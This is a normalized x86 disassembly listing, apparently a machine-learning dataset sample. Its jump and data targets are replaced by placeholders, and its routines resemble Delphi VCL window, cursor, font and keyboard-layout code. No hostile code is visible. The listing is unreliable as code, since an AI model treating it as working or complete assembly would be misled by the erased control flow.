cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_45ad80
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_441328
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45ad80
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4412ec
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_45adf0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_45ad80
pop ecx
mov eax [ esi + 0x34 ]
call sub_450114
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_450124
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_45ae74
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442948
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_40349c
sub_45ae98
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_40349c
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_45aec8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_441328
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45ae98
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45aec8
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4412ec
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45af44
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_45ae98
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_45ae98
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_45aec8
pop ecx
test al al
je r-xdata
sub_45af98
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_40349c
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_45afc8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_441328
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45af98
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45afc8
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4412ec
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b044
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_45af98
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_45af98
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_45afc8
pop ecx
test al al
je r-xdata
sub_45b098
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_413de4
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_44a2a4
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_45b0ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_45b098
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_40349c
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45b168
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_41a874
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_45b1a4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_43e2dc
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_43efc4
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45b1ec
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_4448fc
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_4445f8
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_4445f8
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_4445f8
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_4445f8
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_4445f8
push eax
call RedrawWindow
sub_45b340
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_4560f0
mov dl 0x5
mov eax ebx
call sub_457e64
mov dl 0x1
mov eax ebx
call sub_4431d4
mov dl 0x3
mov eax ebx
call sub_458160
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_45b3a8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45b47f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_443094
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_442f00
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_43d30c
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43dd6c
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_404164
mov eax [ ebp - 0xc ]
call sub_404334
push eax
mov eax [ ebp - 0xc ]
call sub_404534
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_43dd7c
mov eax [ ebp - 0xc ]
call sub_404334
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b486
lea eax [ ebp - 0xc ]
call sub_404074
retn
mov dl 0x1
mov eax esi
call sub_4574e4
mov edx [ ebp - 0xc ]
mov eax esi
call sub_43de28
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_4046c0
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_45b4ac
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_441328
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_456c08
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_4412ec
mov edx ebx
pop ecx
mov si 0xffcc
call sub_40349c
inc ebp
dec edi
jne r-xdata
sub_45b4f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_443094
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_45b524
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44389c
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_45b54c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_4598b4
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4445f8
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_443094
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4445f8
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_4445f8
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_4430a8
or ecx 0xffffffff
mov dl 0x1
call sub_43e4b8
pop esi
pop ebx
retn
sub_45b5e4
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_443d0c
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_43efc4
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_43d798
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_40349c
sub_45b63c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45b702
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43dd6c
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_404164
mov eax [ ebp - 0x4 ]
call sub_404334
push eax
mov eax [ ebp - 0x4 ]
call sub_404534
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_43dd7c
mov eax [ ebp - 0x4 ]
call sub_404334
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43de28
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b709
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_4574e4
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_4046c0
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_45b728
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_443a8c
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_443094
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_4430a8
mov dl [ ebx + 0x57 ]
call sub_43dd18
inc edi
dec esi
jne r-xdata
sub_45b7cc
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_45b7fc
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_45b82c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41a0e4
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45bbd0
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45bbdc
mov eax ebx
call sub_45bbe8
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_458004
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d22c
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d22c
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d22c
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_45c008
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45bee4
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45bee4
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45bee4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_45b984
push ebx
push esi
push edi
push ebp
call sub_40362c
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_4032a0
mov eax [ ebp + 0x88 ]
call sub_4032a0
mov eax [ ebp + 0x84 ]
call sub_4032a0
mov eax [ ebp + 0x54 ]
call sub_4032a0
mov eax [ ebp + 0x50 ]
call sub_4032a0
mov eax [ ebp + 0x4c ]
call sub_4032a0
mov eax [ ebp + 0x30 ]
call sub_4032a0
mov eax [ ebp + 0x34 ]
call sub_4032a0
mov eax [ ebp + 0x7c ]
call sub_4032a0
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_4032a0
mov eax ebp
call sub_45bc44
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_41a130
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_403614
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_413de4
call sub_4032a0
inc edi
dec esi
jne r-xdata
sub_45bafc
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_45bb48
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413c88
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413c88
mov eax [ rw-data ]
call sub_45e8d4
sub_45bb80
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413f80
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413f80
mov eax [ rw-data ]
call sub_45e8d4
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_445bd0
sub_45bbe8
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_45bca0
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_45bc44
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_4026ec
mov ebx esi
test ebx ebx
jne r-xdata
sub_45bca0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4026cc
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_45bcc8
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45be73
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45be7a
lea eax [ ebp - 0x260 ]
call sub_404074
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_404074
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_415dcc
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_408d3c
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_449378
test al al
je r-xdata
xor eax eax
push ebp
push sub_45be2f
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4042e4
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4042e4
sub_45bee4
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_45e744
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45e4f8
mov dl 0x1
mov eax [ rw-data ]
call sub_45e4f8
sub_45bf50
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_45bf78
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_45bf50
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406b20
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406a8c
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45c008
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_45c14d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45e4f8
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41d5bc
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41d5bc
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_41d6a0
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41d5bc
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_41d5bc
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41d5bc
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
